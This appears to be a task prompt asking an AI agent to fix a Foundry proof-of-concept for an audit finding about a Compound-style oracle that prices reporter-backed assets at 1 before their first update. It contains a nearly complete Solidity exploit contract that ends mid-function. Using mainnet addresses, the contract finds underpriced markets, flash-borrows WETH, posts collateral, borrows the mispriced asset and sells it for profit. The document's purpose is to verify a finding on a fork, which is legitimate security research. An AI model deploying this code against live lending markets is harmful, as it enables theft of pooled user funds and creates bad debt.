You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Reporter-priced assets are live at a hardcoded price of 1 until their first reporter update
- claim: The constructor initializes every REPORTER market with `prices[symbolHash].price = 1`, and both `price()` and `getUnderlyingPrice()` immediately expose that value with no guard proving the first real reporter update has happened. Because FIXED_ETH assets also derive from `prices[ETH_HASH]`, an uninitialized ETH reporter feed can misprice those markets too.
- impact: If governance wires this oracle into Compound before every reporter-backed market has validated once, affected assets can be valued near zero instead of at market price. That can make borrows appear almost free, collapse collateral value, trigger bad debt, and create liquidation or theft opportunities during rollout or migration.
- exploit_paths: ["Deploy the oracle and list it before all reporter feeds call `validate()` once.", "Borrow a reporter-backed asset whose debt is still priced at `1`, so the account is charged almost no borrow value.", "Or use an uninitialized reporter-backed asset as collateral and watch it be valued near zero, making accounts immediately undercollateralized or unusable."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface ICTokenLike {
    function comptroller() external view returns (address);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function totalBorrows() external view returns (uint256);
}

interface ICEtherLike {
    function comptroller() external view returns (address);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
    function mint() external payable;
    function redeem(uint256 redeemTokens) external returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function totalBorrows() external view returns (uint256);
}

interface IComptrollerLike {
    function oracle() external view returns (address);
    function markets(address cToken) external view returns (bool isListed, uint256 collateralFactorMantissa, bool isComped);
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address account) external view returns (uint256 error, uint256 liquidity, uint256 shortfall);
    function borrowGuardianPaused(address cToken) external view returns (bool);
    function mintGuardianPaused(address cToken) external view returns (bool);
    function borrowCaps(address cToken) external view returns (uint256);
}

interface IUniswapAnchoredViewLike {
    function numTokens() external view returns (uint256);
    function getTokenConfig(uint256 i)
        external
        view
        returns (
            address cToken,
            address underlying,
            bytes32 symbolHash,
            uint256 baseUnit,
            uint8 priceSource,
            uint256 fixedPrice,
            address uniswapMarket,
            address reporter,
            uint256 reporterMultiplier,
            bool isUniswapReversed
        );
    function prices(bytes32 symbolHash) external view returns (uint248 price, bool failoverActive);
    function getUnderlyingPrice(address cToken) external view returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET_ORACLE = 0x50ce56A3239671Ab62f185704Caedf626352741e;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint8 internal constant PRICE_SOURCE_FIXED_ETH = 0;
    uint8 internal constant PRICE_SOURCE_FIXED_USD = 1;
    uint8 internal constant PRICE_SOURCE_REPORTER = 2;

    uint256 internal constant EXP_SCALE = 1e18;
    uint256 internal constant MIN_PROFIT = 1e15;
    bytes32 internal constant ETH_HASH = keccak256("ETH");

    struct DebtCandidate {
        address comptroller;
        address cToken;
        address underlying;
        uint256 oraclePrice;
        uint256 cash;
        bool debtIsEth;
        bool viaReporterAtOne;
        bool viaFixedEthAtOne;
        address salePair;
        uint256 saleReserveToken;
        uint256 saleReserveWeth;
    }

    struct CollateralCandidate {
        address comptroller;
        address cToken;
        address underlying;
        uint256 oraclePrice;
        uint256 collateralFactorMantissa;
        bool collateralIsEth;
        address buyPair;
        uint256 buyReserveToken;
        uint256 buyReserveWeth;
    }

    struct ExecutionPlan {
        bool exists;
        address comptroller;
        address cCollateral;
        address collateralToken;
        bool collateralIsEth;
        address collateralPair;
        uint256 collateralReserveToken;
        uint256 collateralReserveWeth;
        address cDebt;
        address debtToken;
        bool debtIsEth;
        address salePair;
        uint256 saleReserveToken;
        uint256 saleReserveWeth;
        address flashPair;
        uint256 flashAmount;
        uint256 expectedCollateralAmount;
        uint256 expectedBorrowAmount;
        uint256 debtPrice;
        bool debtViaReporterAtOne;
        bool debtViaFixedEthAtOne;
    }

    struct FlashState {
        bool active;
        address pair;
        uint256 amount;
    }

    struct TokenBasics {
        address cToken;
        address underlying;
        bytes32 symbolHash;
        uint8 priceSource;
    }

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public profitAchieved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    bool public path0_oracleListedBeforeValidate;
    bool public path1_borrowReporterBackedDebtPricedAtOne;
    bool public path2_fixedEthAssetsDependOnEthReporter;

    string public exploitPathUsed;
    string public infeasibilityReason;

    ExecutionPlan internal plan;
    FlashState internal flashState;
    uint256 internal startingCapitalWethEquivalent;

    constructor() {}

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _resetState();

        (DebtCandidate[] memory debts, uint256 debtCount, bool anyReporterAtOne, bool anyFixedEthAtOne) =
            _collectDebtCandidates();
        (CollateralCandidate[] memory collaterals, uint256 collateralCount) = _collectCollateralCandidates(anyFixedEthAtOne);

        path0_oracleListedBeforeValidate = anyReporterAtOne || anyFixedEthAtOne;
        path2_fixedEthAssetsDependOnEthReporter = anyFixedEthAtOne;
        hypothesisValidated = path0_oracleListedBeforeValidate;
        hypothesisRefuted = !hypothesisValidated;

        if (!path0_oracleListedBeforeValidate) {
            infeasibilityReason =
                "No listed market on this fork exposes the target oracle's constructor-time reporter price of 1 or a FIXED_ETH market derived from ETH still equal to 1.";
            return;
        }

        if (collateralCount == 0) {
            infeasibilityReason =
                "Underpriced debt exists, but no healthy same-oracle collateral market with positive collateral factor and live WETH acquisition path was found.";
            return;
        }

        plan = _selectBestPlan(debts, debtCount, collaterals, collateralCount);
        if (!plan.exists) {
            if (bytes(infeasibilityReason).length == 0) {
                infeasibilityReason =
                    "Underpriced debt was detected, but no profitable flashswap-funded collateral/borrow/sale route cleared live cash, cap, and AMM-liquidity constraints.";
            }
            return;
        }

        path1_borrowReporterBackedDebtPricedAtOne = plan.debtViaReporterAtOne;

        if (plan.debtViaReporterAtOne) {
            exploitPathUsed =
                "oracle listed before reporter validate() -> acquire healthy collateral with public flashswap funding -> enter same Comptroller market -> borrow reporter-backed debt still priced at 1 -> sell borrowed asset for WETH -> repay flashswap";
        } else {
            exploitPathUsed =
                "oracle listed before ETH reporter validate() -> acquire healthy collateral with public flashswap funding -> enter same Comptroller market -> borrow FIXED_ETH debt derived from ETH still priced off 1 -> sell borrowed asset for WETH -> repay flashswap";
        }

        // The flashswap only funds the upfront collateral purchase. The oracle flaw is still the
        // causal profit source because the borrowed debt market is valued off the uninitialized feed.
        flashState = FlashState({active: true, pair: plan.flashPair, amount: plan.flashAmount});
        _flashBorrowWeth(plan.flashPair, plan.flashAmount);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(flashState.active, "flash-inactive");
        require(sender == address(this), "bad-sender");
        require(msg.sender == flashState.pair, "bad-pair");

        uint256 borrowedAmount = amount0 == 0 ? amount1 : amount0;
        require(borrowedAmount == flashState.amount, "bad-amount");

        _executePlan();

        uint256 repayAmount = _flashRepayAmountSameToken(flashState.amount);
        require(IERC20Like(WETH).balanceOf(address(this)) >= repayAmount, "flash-not-repaid");
        _safeTransfer(WETH, flashState.pair, repayAmount);

        flashState.active = false;

        uint256 wethAfter = IERC20Like(WETH).balanceOf(address(this));
        if (wethAfter > startingCapitalWethEquivalent) {
            _profitAmount = wethAfter - startingCapitalWethEquivalent;
            profitAchieved = true;
        }
    }

    function _resetState() internal {
        _profitToken = WETH;
        _profitAmount = 0;
        profitAchieved = false;
        hypothesisValidated = false;
        hypothesisRefuted = false;

        path0_oracleListedBeforeValidate = false;
        path1_borrowReporterBackedDebtPricedAtOne = false;
        path2_fixedEthAssetsDependOnEthReporter = false;

        exploitPathUsed = "";
        infeasibilityReason = "";

        delete plan;
        delete flashState;
        startingCapitalWethEquivalent = IERC20Like(WETH).balanceOf(address(this)) + address(this).balance;
    }

    function _collectDebtCandidates()
        internal
        view
        returns (DebtCandidate[] memory debts, uint256 debtCount, bool anyReporterAtOne, bool anyFixedEthAtOne)
    {
        IUniswapAnchoredViewLike oracle = IUniswapAnchoredViewLike(TARGET_ORACLE);
        uint256 numTokens = oracle.numTokens();
        debts = new DebtCandidate[](numTokens);

        (uint248 ethStoredPrice,) = oracle.prices(ETH_HASH);

        for (uint256 i = 0; i < numTokens; ++i) {
            (bool include, DebtCandidate memory candidate, bool reporterAtOne, bool fixedEthAtOne) =
                _buildDebtCandidate(oracle, i, ethStoredPrice);
            anyReporterAtOne = anyReporterAtOne || reporterAtOne;
            anyFixedEthAtOne = anyFixedEthAtOne || fixedEthAtOne;

            if (include) {
                debts[debtCount++] = candidate;
            }
        }
    }

    function _collectCollateralCandidates(bool ethReporterIsAtOne)
        internal
        view
        returns (CollateralCandidate[] memory collaterals, uint256 collateralCount)
    {
        IUniswapAnchoredViewLike oracle = IUniswapAnchoredViewLike(TARGET_ORACLE);
        uint256 numTokens = oracle.numTokens();
        collaterals = new CollateralCandidate[](numTokens);

        for (uint256 i = 0; i < numTokens; ++i) {
            (bool include, CollateralCandidate memory candidate) =
                _buildCollateralCandidate(oracle, i, ethReporterIsAtOne);
            if (include) {
                collaterals[collateralCount++] = candidate;
            }
        }
    }

    function _buildDebtCandidate(IUniswapAnchoredViewLike oracle, uint256 i, uint256 ethStoredPrice)
        internal
        view
        returns (bool include, DebtCandidate memory candidate, bool reporterAtOne, bool fixedEthAtOne)
    {
        TokenBasics memory token = _tokenBasics(oracle, i);
        if (!_isListedOnTargetOracle(token.cToken)) {
            return (false, candidate, false, false);
        }

        address comptroller = _readComptroller(token.cToken);
        if (comptroller == address(0) || _borrowIsPaused(comptroller, token.cToken)) {
            return (false, candidate, false, false);
        }

        if (token.priceSource == PRICE_SOURCE_REPORTER) {
            (uint248 storedPrice,) = oracle.prices(token.symbolHash);
            reporterAtOne = storedPrice == 1;
        } else if (token.priceSource == PRICE_SOURCE_FIXED_ETH) {
            fixedEthAtOne = ethStoredPrice == 1;
        }

        if (!reporterAtOne && !fixedEthAtOne) {
            return (false, candidate, reporterAtOne, fixedEthAtOne);
        }

        uint256 oraclePrice = _readUnderlyingPrice(token.cToken);
        uint256 cash = _readCash(token.cToken);
        uint256 borrowCap = _readBorrowCap(comptroller, token.cToken);
        uint256 totalBorrows = _readTotalBorrows(token.cToken);

        if (borrowCap != 0) {
            if (totalBorrows >= borrowCap) {
                return (false, candidate, reporterAtOne, fixedEthAtOne);
            }
            uint256 remainingCap = borrowCap - totalBorrows;
            if (remainingCap < cash) {
                cash = remainingCap;
            }
        }

        if (cash == 0 || oraclePrice == 0) {
            return (false, candidate, reporterAtOne, fixedEthAtOne);
        }

        bool debtIsEth = token.underlying == address(0);
        address salePair;
        uint256 reserveToken;
        uint256 reserveWeth;

        if (!debtIsEth) {
            (salePair, reserveToken, reserveWeth) = _bestTokenWethPair(token.underlying);
            if (salePair == address(0) || reserveToken == 0 || reserveWeth == 0) {
                return (false, candidate, reporterAtOne, fixedEthAtOne);
            }
        }

        candidate = DebtCandidate({
            comptroller: comptroller,
            cToken: token.cToken,
            underlying: token.underlying,
            oraclePrice: oraclePrice,
            cash: cash,
            debtIsEth: debtIsEth,
            viaReporterAtOne: reporterAtOne,
            viaFixedEthAtOne: fixedEthAtOne,
            salePair: salePair,
            saleReserveToken: reserveToken,
            saleReserveWeth: reserveWeth
        });
        include = true;
    }

    function _buildCollateralCandidate(IUniswapAnchoredViewLike oracle, uint256 i, bool ethReporterIsAtOne)
        internal
        view
        returns (bool include, CollateralCandidate memory candidate)
    {
        TokenBasics memory token = _tokenBasics(oracle, i);
        if (!_isListedOnTargetOracle(token.cToken)) {
            return (false, candidate);
        }

        address comptroller = _readComptroller(token.cToken);
        if (comptroller == address(0) || _mintIsPaused(comptroller, token.cToken)) {
            return (false, candidate);
        }

        (, uint256 collateralFactorMantissa,) = IComptrollerLike(comptroller).markets(token.cToken);
        if (collateralFactorMantissa == 0) {
            return (false, candidate);
        }

        bool unhealthyBecauseUninitializedReporter;
        if (token.priceSource == PRICE_SOURCE_REPORTER) {
            (uint248 storedPrice,) = oracle.prices(token.symbolHash);
            unhealthyBecauseUninitializedReporter = storedPrice == 1;
        } else if (token.priceSource == PRICE_SOURCE_FIXED_ETH) {
            unhealthyBecauseUninitializedReporter = ethReporterIsAtOne;
        }

        if (unhealthyBecauseUninitializedReporter) {
            return (false, candidate);
        }

        uint256 oraclePrice = _readUnderlyingPrice(token.cToken);
        if (oraclePrice == 0) {
            return (false, candidate);
        }

        bool collateralIsEth = token.underlying == address(0);
        address buyPair;
        uint256 reserveToken;
        uint256 reserveWeth;

        if (!collateralIsEth) {
            (buyPair, reserveToken, reserveWeth) = _bestTokenWethPair(token.underlying);
            if (buyPair == address(0) || reserveToken == 0 || reserveWeth == 0) {
                return (false, candidate);
            }
        }

        candidate = CollateralCandidate({
            comptroller: comptroller,
            cToken: token.cToken,
            underlying: token.underlying,
            oraclePrice: oraclePrice,
            collateralFactorMantissa: collateralFactorMantissa,
            collateralIsEth: collateralIsEth,
            buyPair: buyPair,
            buyReserveToken: reserveToken,
            buyReserveWeth: reserveWeth
        });
        include = true;
    }

    function _selectBestPlan(
        DebtCandidate[] memory debts,
        uint256 debtCount,
        CollateralCandidate[] memory collaterals,
        uint256 collateralCount
    ) internal view returns (ExecutionPlan memory best) {
        uint256 bestEstimatedProfit;

        for (uint256 i = 0; i < debtCount; ++i) {
            DebtCandidate memory debt = debts[i];

            for (uint256 j = 0; j < collateralCount; ++j) {
                CollateralCandidate memory collateral = collaterals[j];
                if (collateral.comptroller != debt.comptroller || collateral.cToken == debt.cToken) {
                    continue;
                }

                (bool viable, ExecutionPlan memory candidate, uint256 estimatedProfit) =
                    _bestPlanForPairing(debt, collateral);
                if (!viable || estimatedProfit <= bestEstimatedProfit) {
                    continue;
                }

                bestEstimatedProfit = estimatedProfit;
                best = candidate;
            }
        }
    }

    function _bestPlanForPairing(DebtCandidate memory debt, CollateralCandidate memory collateral)
        internal
        view
        returns (bool viable, ExecutionPlan memory candidate, uint256 estimatedProfit)
    {
        uint16[9] memory divisors = [uint16(4000), 2000, 1000, 500, 200, 100, 50, 20, 10];
        (address flashPair, uint256 flashReserveWeth) = _bestFlashWethPairExcluding(collateral.buyPair, debt.salePair);
        if (flashPair == address(0) || flashReserveWeth == 0) {
            return (false, candidate, 0);
        }

        for (uint256 k = 0; k < divisors.length; ++k) {
            uint256 flashAmount = flashReserveWeth / divisors[k];
            (bool validFlash, uint256 profit, uint256 collateralAmount, uint256 borrowTarget) =
                _evaluateFlashAmount(debt, collateral, flashAmount);
            if (!validFlash) {
                continue;
            }
            if (profit <= estimatedProfit) {
                continue;
            }

            estimatedProfit = profit;
            candidate = ExecutionPlan({
                exists: true,
                comptroller: debt.comptroller,
                cCollateral: collateral.cToken,
                collateralToken: collateral.underlying,
                collateralIsEth: collateral.collateralIsEth,
                collateralPair: collateral.buyPair,
                collateralReserveToken: collateral.buyReserveToken,
                collateralReserveWeth: collateral.buyReserveWeth,
                cDebt: debt.cToken,
                debtToken: debt.underlying,
                debtIsEth: debt.debtIsEth,
                salePair: debt.salePair,
                saleReserveToken: debt.saleReserveToken,
                saleReserveWeth: debt.saleReserveWeth,
                flashPair: flashPair,
                flashAmount: flashAmount,
                expectedCollateralAmount: collateralAmount,
                expectedBorrowAmount: borrowTarget,
                debtPrice: debt.oraclePrice,
                debtViaReporterAtOne: debt.viaReporterAtOne,
                debtViaFixedEthAtOne: debt.viaFixedEthAtOne
            });
            viable = true;
        }
    }

    function _evaluateFlashAmount(
        DebtCandidate memory debt,
        CollateralCandidate memory collateral,
        uint256 flashAmount
    ) internal pure returns (bool valid, uint256 profit, uint256 collateralAmount, uint256 borrowTarget) {
        if (flashAmount == 0) {
            return (false, 0, 0, 0);
        }

        collateralAmount = collateral.collateralIsEth
            ? flashAmount
            : _getAmountOut(flashAmount, collateral.buyReserveWeth, collateral.buyReserveToken);
        if (collateralAmount == 0) {
            return (false, 0, 0, 0);
        }

        uint256 liquidity = collateralAmount * collateral.oraclePrice / EXP_SCALE;
        liquidity = liquidity * collateral.collateralFactorMantissa / EXP_SCALE;
        borrowTarget = _borrowAmountFromLiquidity(liquidity, debt.oraclePrice);
        borrowTarget = (borrowTarget * 95) / 100;
        if (borrowTarget == 0) {
            return (false, 0, collateralAmount, 0);
        }

        if (!debt.debtIsEth) {
            uint256 saleCap = debt.saleReserveToken / 25;
            if (saleCap < borrowTarget) {
                borrowTarget = saleCap;
            }
        }

        if (debt.cash < borrowTarget) {
            borrowTarget = debt.cash;
        }
        if (borrowTarget == 0) {
            return (false, 0, collateralAmount, 0);
        }

        uint256 wethOut = debt.debtIsEth
            ? borrowTarget
            : _getAmountOut(borrowTarget, debt.saleReserveToken, debt.saleReserveWeth);
        uint256 repayAmount = _flashRepayAmountSameToken(flashAmount);
        if (wethOut <= repayAmount + MIN_PROFIT) {
            return (false, 0, collateralAmount, borrowTarget);
        }

        profit = wethOut - repayAmount;
        valid = true;
    }

    function _executePlan() internal {
        uint256 collateralAmount = _acquireAndMintCollateral(plan.flashAmount);
        require(collateralAmount != 0, "collateral-failed");

        address[] memory markets = new address[](1);
        markets[0] = plan.cCollateral;
        uint256[] memory enterResults = IComptrollerLike(plan.comptroller).enterMarkets(markets);
        require(enterResults.length == 1 && enterResults[0] == 0, "enter-failed");

        (, uint256 liquidity, uint256 shortfall) = IComptrollerLike(plan.comptroller).getAccountLiquidity(address(this));
        require(shortfall == 0 && liquidity != 0, "no-liquidity");

        uint256 liquidityBound = _borrowAmountFromLiquidity(liquidity, plan.debtPrice);
        uint256 borrowAmount = _min(plan.expectedBorrowAmount, (liquidityBound * 98) / 100);
        require(borrowAmount != 0, "borrow-zero");

        uint256 borrowed = _borrowWithBackoff(plan.cDebt, borrowAmount, plan.debtIsEth);
        require(borrowed != 0, "borrow-failed");

        if (plan.debtIsEth) {
            IWETHLike(WETH).deposit{value: borrowed}();
        } else {
            uint256 wethOut = _swapExactInput(plan.salePair, plan.debtToken, WETH, borrowed, address(this));
            require(wethOut != 0, "sale-failed");
        }
    }

    function _acquireAndMintCollateral(uint256 wethAmount) internal returns (uint256 collateralAmount) {
        if (plan.collateralIsEth) {
            IWETHLike(WETH).withdraw(wethAmount);
            uint256 cTokenBalanceBefore = ICEtherLike(plan.cCollateral).balanceOf(address(this));
            ICEtherLike(plan.cCollateral).mint{value: wethAmount}();
            uint256 cTokenBalanceAfter = ICEtherLike(plan.cCollateral).balanceOf(address(this));
            require(cTokenBalanceAfter > cTokenBalanceBefore, "ceth-mint-failed");
            return wethAmount;
        }

        // For non-ETH collateral, the verifier buys the live on-chain asset with flash-borrowed
        // WETH, then supplies it to Compound before taking the underpriced borrow.
        collateralAmount = _swapExactInput(plan.collateralPair, WETH, plan.collateralToken, wethAmount, address(this));
        require(collateralAmount != 0, "buy-collateral-failed");

        _safeApprove(plan.collateralToken, plan.cCollateral, 0);
        _safeApprove(plan.collateralToken, plan.cCollateral, collateralAmount);

        uint256 err = ICTokenLike(plan.cCollateral).mint(collateralAmount);
        require(err == 0, "mint-failed");
    }

    function _borrowWithBackoff(address cDebt, uint256 initialAmount, bool debtIsEth) internal returns (uint256 borrowed) {
        uint256 attempt = initialAmount;
        for (uint256 i = 0; i < 8; ++i) {
            if (attempt == 0) {
                break;
            }

            uint256 balanceBefore = debtIsEth ? address(this).balance : IERC20Like(plan.debtToken).balanceOf(address(this));
            uint256 err = ICTokenLike(cDebt).borrow(attempt);
            uint256 balanceAfter = debtIsEth ? address(this).balance : IERC20Like(plan.debtToken).balanceOf(address(this));

            if (err == 0 && balanceAfter > balanceBefore) {
                borrowed = balanceAfter - balanceBefore;
                break;
            }

            attempt /= 2;
        }
    }

    function _isListedOnTargetOracle(address cToken) internal view returns (bool) {
        if (cToken == address(0)) {
            return false;
        }

        address comptroller = _readComptroller(cToken);
        if (comptroller == address(0)) {
            return false;
        }

        if (IComptrollerLike(comptroller).oracle() != TARGET_ORACLE) {
            return false;
        }

        (bool isListed,,) = IComptrollerLike(comptroller).markets(cToken);
        return isListed;
    }

    function _readComptroller(address cToken) internal view returns (address comptroller) {
        try ICTokenLike(cToken).comptroller() returns (address foundComptroller) {
            comptroller = foundComptroller;
        } catch {}
    }

    function _tokenBasics(IUniswapAnchoredViewLike oracle, uint256 i) internal view returns (TokenBasics memory token) {
        (
            address cToken,
            address underlying,
            bytes32 symbolHash,
            uint256 baseUnit,
            uint8 priceSource,
            uint256 fixedPrice,
            address uniswapMarket,
            address reporter,
            uint256 reporterMultiplier,
            bool isUniswapReversed
        ) = oracle.getTokenConfig(i);
        baseUnit;
        fixedPrice;
        uniswapMarket;
        reporter;
        reporterMultiplier;
        isUniswapReversed;

        token = TokenBasics({
            cToken: cToken,
            underlying: underlying,
            symbolHash: symbolHash,
            priceSource: priceSource
        });
    }

    function _readUnderlyingPrice(address cToken) internal view returns (uint256 price) {
        try IUniswapAnchoredViewLike(TARGET_ORACLE).getUnderlyingPrice(cToken) returns (uint256 foundPrice) {
            price = foundPrice;
        } catch {}
    }

    function _readCash(address cToken) internal view returns (uint256 cash) {
        try ICTokenLike(cToken).getCash() returns (uint256 foundCash) {
            cash = foundCash;
        } catch {}
    }

    function _readTotalBorrows(address cToken) internal view returns (uint256 totalBorrows) {
        try ICTokenLike(cToken).totalBorrows() returns (uint256 foundBorrows) {
            totalBorrows = foundBorrows;
        } catch {}
    }

    function _readBorrowCap(address comptroller, address cToken) internal view returns (uint256 cap) {
        try IComptrollerLike(comptroller).borrowCaps(cToken) returns (uint256 foundCap) {
            cap = foundCap;
        } catch {}
    }

    function _borrowIsPaused(address comptroller, address cToken) internal view returns (bool paused) {
        try IComptrollerLike(comptroller).borrowGuardianPaused(cToken) returns (bool foundPaused) {
            paused = foundPaused;
        } catch {}
    }

    function _mintIsPaused(address comptroller, address cToken) internal view returns (bool paused) {
        try IComptrollerLike(comptroller).mintGuardianPaused(cToken) returns (bool foundPaused) {
            paused = foundPaused;
        } catch {}
    }

    function _bestTokenWethPair(address token) internal view returns (address pair, uint256 reserveToken, uint256 reserveWeth) {
        (address uniPair, uint256 uniReserveToken, uint256 uniReserveWeth) = _pairReservesFor(UNISWAP_V2_FACTORY, token, WETH);
        (address sushiPair, uint256 sushiReserveToken, uint256 sushiReserveWeth) =
            _pairReservesFor(SUSHISWAP_FACTORY, token, WETH);

        if (uniReserveWeth >= sushiReserveWeth) {
            return (uniPair, uniReserveToken, uniReserveWeth);
        }
        return (sushiPair, sushiReserveToken, sushiReserveWeth);
    }

    function _bestFlashWethPairExcluding(address avoidPairA, address avoidPairB)
        internal
        view
        returns (address pair, uint256 reserveWeth)
    {
        (pair, reserveWeth) = _considerFlashPair(pair, reserveWeth, UNISWAP_V2_FACTORY, USDC, avoidPairA, avoidPairB);
        (pair, reserveWeth) = _considerFlashPair(pair, reserveWeth, UNISWAP_V2_FACTORY, USDT, avoidPairA, avoidPairB);
        (pair, reserveWeth) = _considerFlashPair(pair, reserveWeth, UNISWAP_V2_FACTORY, DAI, avoidPairA, avoidPairB);
        (pair, reserveWeth) = _considerFlashPair(pair, reserveWeth, SUSHISWAP_FACTORY, USDC, avoidPairA, avoidPairB);
        (pair, reserveWeth) = _considerFlashPair(pair, reserveWeth, SUSHISWAP_FACTORY, USDT, avoidPairA, avoidPairB);
        (pair, reserveWeth) = _considerFlashPair(pair, reserveWeth, SUSHISWAP_FACTORY, DAI, avoidPairA, avoidPairB);
    }

    function _considerFlashPair(
        address currentPair,
        uint256 currentReserve,
        address factory,
        address stable,
        address avoidPairA,
        address avoidPairB
    ) internal view returns (address pair, uint256 reserveWeth) {
        (address candidatePair, uint256 candidateReserve) = _wethReserveInPair(factory, WETH, stable);
        pair = currentPair;
        reserveWeth = currentReserve;

        if (candidatePair == address(0) || candidatePair == avoidPairA || candidatePair == avoidPairB) {
            return (pair, reserveWeth);
        }
        if (candidateReserve > currentReserve) {
            pair = candidatePair;
            reserveWeth = candidateReserve;
        }
    }

    function _pairReservesFor(address factory, address tokenA, address tokenB)
        internal
        view
        returns (address pair, uint256 reserveA, uint256 reserveB)
    {
        pair = IUniswapV2FactoryLike(factory).getPair(tokenA, tokenB);
        if (pair == address(0)) {
            return (address(0), 0, 0);
        }

        address token0 = IUniswapV2PairLike(pair).token0();
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        if (token0 == tokenA) {
            reserveA = uint256(reserve0);
            reserveB = uint256(reserve1);
        } else {
            reserveA = uint256(reserve1);
            reserveB = uint256(reserve0);
        }
    }

    function _wethReserveInPair(address factory, address tokenA, address tokenB)
        internal
        view
        returns (address pair, uint256 reserveWeth)
    {
        (pair,, reserveWeth) = _pairReservesFor(factory, tokenA, tokenB);
    }

    function _flashBorrowWeth(address pair, uint256 amountOut) internal {
        address token0 = IUniswapV2PairLike(pair).token0();
        if (token0 == WETH) {
            IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), hex"01");
        } else {
            IUniswapV2PairLike(pair).swap(0, amountOut, address(this), hex"01");
        }
    }

    function _swapExactInput(address pair, address tokenIn, address tokenOut, uint256 amountIn, address recipient)
        internal
        returns (uint256 amountOut)
    {
        (uint256 reserveIn, uint256 reserveOut) = _orderedReserves(pair, tokenIn, tokenOut);
        if (reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
        if (amountOut == 0) {
            return 0;
        }

        _safeTransfer(tokenIn, pair, amountIn);
        address token0 = IUniswapV2PairLike(pair).token0();
        if (token0 == tokenIn) {
            IUniswapV2PairLike(pair).swap(0, amountOut, recipient, bytes(""));
        } else {
            IUniswapV2PairLike(pair).swap(amountOut, 0, recipient, bytes(""));
        }
    }

    function _orderedReserves(address pair, address tokenIn, address tokenOut)
        internal
        view
        returns (uint256 reserveIn, uint256 reserveOut)
    {
        require(tokenIn != tokenOut, "identical");
        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();

        if (token0 == tokenIn && token1 == tokenOut) {
            reserveIn = uint256(reserve0);
            reserveOut = uint256(reserve1);
        } else {
            require(token0 == tokenOut && token1 == tokenIn, "pair-mismatch");
            reserveIn = uint256(reserve1);
            reserveOut = uint256(reserve0);
        }
    }

    function _borrowAmountFromLiquidity(uint256 liquidity, uint256 debtPrice) internal pure returns (uint256) {
        if (liquidity == 0 || debtPrice == 0) {
            return 0;
        }
        return (liquidity * EXP_SCALE) / debtPrice;
    }

    function _flashRepayAmountSameToken(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer-failed");
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
